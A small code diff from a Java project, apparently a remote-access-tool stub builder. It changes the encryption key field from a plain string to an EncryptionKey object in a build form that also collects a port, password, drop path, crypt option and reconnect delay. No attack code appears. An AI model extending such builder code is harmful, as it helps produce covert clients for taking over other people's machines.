@@ -35,6 +35,7 @@ import com.redpois0n.OSConfig;
 import com.redpois0n.build.Build;
 import com.redpois0n.common.OperatingSystem;
 import com.redpois0n.common.crypto.Crypto;
+import com.redpois0n.common.crypto.EncryptionKey;
 import com.redpois0n.io.Files;
 import com.redpois0n.listeners.MinimalBuildListener;
 import com.redpois0n.plugins.PluginList;
@@ -299,7 +300,7 @@ public class FrameBuildMinimal extends BaseFrame {
 				int port = (Integer) spPort.getValue();
 				String id = txtId.getText().trim();
 				String pass = txtPass.getText().trim();
-				String key = txtKey.getText().trim();
+				EncryptionKey key = new EncryptionKey(txtKey.getText().trim());
 				boolean crypt = chckbxEmbed.isSelected();
 				String droppath = cbLocation.getSelectedItem().toString();
 				int reconSec = 10;
